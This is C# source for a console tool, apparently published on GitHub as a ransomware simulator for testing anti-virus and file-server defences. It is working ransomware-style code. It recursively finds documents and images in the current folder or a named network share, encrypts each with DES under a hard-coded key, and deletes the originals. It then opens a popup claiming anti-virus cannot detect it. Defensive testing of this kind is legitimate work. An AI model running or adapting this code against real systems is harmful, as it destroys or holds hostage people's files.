using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Collections;
using System.Diagnostics;
using System.Security.AccessControl;
using System.Globalization;
using System.Text.RegularExpressions;

namespace EncryptDelTestv3
{
    public static class GlobalVar
    {
        public static string sSecretKey = "";
        public static string myargs = "";
        public static string choose = "";
        public static int encryptedcount = 0;
    }

    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[Encrypt Delete Test v3]");
            Console.WriteLine("Simulate ransomware encryption operation");
            Console.WriteLine("By Eddie Chu eddiechu.android@gmail.com");
            Console.WriteLine("Please download the original and latest version from github.com/eddiechu/Encrypt-Delete-Test");
            Console.WriteLine("Version v3.0.4 (14/Aug/2021)");
            Console.WriteLine("");
            Console.WriteLine("This tool encrypt the file, with the extension of *.doc,*.docx,*.xls,*.xlsx,*.txt,*.rtf,*.pdf,*.jpg,*.jpeg,*.gif,*.bmp,*.png, under current folder and it's subfolder(s))");
            Console.WriteLine("");
            Console.WriteLine("[Caution]");
            Console.WriteLine("You use this tool completely at your own risk.");
            Console.WriteLine("");
            do
            {
                Console.WriteLine("[Options]");
                Console.WriteLine(">confirm                 Encrypt current folder (test this computer)");
                Console.WriteLine(">confirm \"N:\\Folder\"     Encrypt network share (test file server)");
                Console.WriteLine("Please type the option: >");
                GlobalVar.choose = Console.ReadLine();
            } while (!GlobalVar.choose.StartsWith("confirm"));

            Console.WriteLine("");
            String specifiedpath;
            specifiedpath = "";
            if (GlobalVar.choose.StartsWith("confirm"))
            {
                var collection = Regex.Matches(GlobalVar.choose, "\".*?\"");
                foreach (var item in collection)
                {
                    specifiedpath = item.ToString().Trim('"');
                    Console.WriteLine("Specified Path is " + specifiedpath);
                }
                GlobalVar.choose = "1";
            }

            GlobalVar.sSecretKey = GenerateKey();
            GlobalVar.sSecretKey = "enckey98";
            GCHandle gch = GCHandle.Alloc(GlobalVar.sSecretKey, GCHandleType.Pinned);

            string path;
            if (string.IsNullOrEmpty(specifiedpath))
            {
                path = @System.IO.Directory.GetCurrentDirectory();
            }
            else
            {
                path = specifiedpath;
            }
            if (File.Exists(path))
            {
                ProcessFile(path);
            }
            else if (Directory.Exists(path))
            {
                ProcessDirectory(path);
            }
            else
            {
                Console.WriteLine("{0} is not a valid file or directory.", path);
            }

            String encryptionkey;
            encryptionkey = GlobalVar.sSecretKey + " ";
            ZeroMemory(gch.AddrOfPinnedObject(), GlobalVar.sSecretKey.Length * 2);
            gch.Free();

            if (GlobalVar.encryptedcount > 0)
            {
                using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"popup.html"))
                {
                    file.WriteLine("<html>");
                    file.WriteLine("<head>");
                    file.WriteLine("<title>EncryptDelTestv3</title>");

                    file.WriteLine("<body bgcolor=red>");
                    file.WriteLine("<font size=+10 color=white><b>[EncryptDelTestv3]</b></font><br><br><br><br>");
                    file.WriteLine("<font size=+10 color=white>Your anti-virus software <u>CANNOT</u> detect this test</font><br><br>");
                    file.WriteLine("<br>");
                    file.WriteLine("<br>");
                    file.WriteLine("<br>Encryption Key: " + encryptionkey);
                    file.WriteLine("<br>Encrypted File: " + GlobalVar.encryptedcount);
                    file.WriteLine("<br>Path: " + path);
                    file.WriteLine("<br>" + DateTime.Now);
                    file.WriteLine("<br>");
                    file.WriteLine("</body>");
                    file.WriteLine("</html>");
                }
                Process.Start(@"popup.html");
                Console.WriteLine("");
                Console.WriteLine("");
                Console.WriteLine("Encryption Key: " + encryptionkey);
                Console.WriteLine("Encrypted File: " + GlobalVar.encryptedcount);
                Console.WriteLine("Your anti-virus software CANNOT detect this test");
            }
            else
            {
                Console.WriteLine("No file is found or encrypted");
            }
            Console.WriteLine("");
            Console.WriteLine("Press any key to continue . . .");
            Console.ReadKey();
        }

        [System.Runtime.InteropServices.DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);

        static string GenerateKey()
        {
            DESCryptoServiceProvider desCrypto = (DESCryptoServiceProvider)DESCryptoServiceProvider.Create();
            return ASCIIEncoding.ASCII.GetString(desCrypto.Key);
        }

        static void EncryptFileDES(string sInputFilename,
           string sOutputFilename,
           string sKey)
        {
            FileStream fsInput = new FileStream(sInputFilename,
               FileMode.Open,
               FileAccess.Read);

            FileStream fsEncrypted = new FileStream(sOutputFilename,
               FileMode.Create,
               FileAccess.Write);
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
            DES.IV = ASCIIEncoding.ASCII.GetBytes(sKey);
            ICryptoTransform desencrypt = DES.CreateEncryptor();
            CryptoStream cryptostream = new CryptoStream(fsEncrypted,
               desencrypt,
               CryptoStreamMode.Write);

            byte[] bytearrayinput = new byte[fsInput.Length];
            fsInput.Read(bytearrayinput, 0, bytearrayinput.Length);
            cryptostream.Write(bytearrayinput, 0, bytearrayinput.Length);
            cryptostream.Close();
            fsInput.Close();
            fsEncrypted.Close();
            GlobalVar.encryptedcount = GlobalVar.encryptedcount + 1;
        }

        public static void ProcessDirectory(string targetDirectory)
        {
            String supportedfileextensions;
            supportedfileextensions = "*.doc,*.docx,*.xls,*.xlsx,*.txt,*.rtf,*.pdf,*.jpg,*.jpeg,*.gif,*.bmp,*.png";
            string[] fileEntries = Directory.GetFiles(targetDirectory);
            foreach (string fileName in fileEntries)
            {
                if (supportedfileextensions.Contains(Path.GetExtension(fileName)))
                {
                    ProcessFile(fileName);
                }
            }

            // Recurse into subdirectories of this directory.
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            foreach (string subdirectory in subdirectoryEntries)
                ProcessDirectory(subdirectory);
        }

        public static void ProcessFile(string path)
        {
            Console.WriteLine("");
            Console.WriteLine("Encrypt to '{0}'", path + ".encrypted");

            string newfileext;

            newfileext = ".encrypted";
            EncryptFileDES(@path, @path + newfileext, GlobalVar.sSecretKey);

            Console.WriteLine("Delete '{0}'", path);
            if (GlobalVar.choose == "1b" || GlobalVar.choose == "2b")
            {
                Console.WriteLine("Overwrite '{0}'", path);
                File.Copy(path + newfileext, path, true);
                File.Copy(path, path + newfileext, true);
            }
            File.Delete(path);
            Console.Write("'" + path + "' ");
            Console.WriteLine(File.Exists(path) ? "File exists." : "File does not exist.");
        }

        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }

    }
}
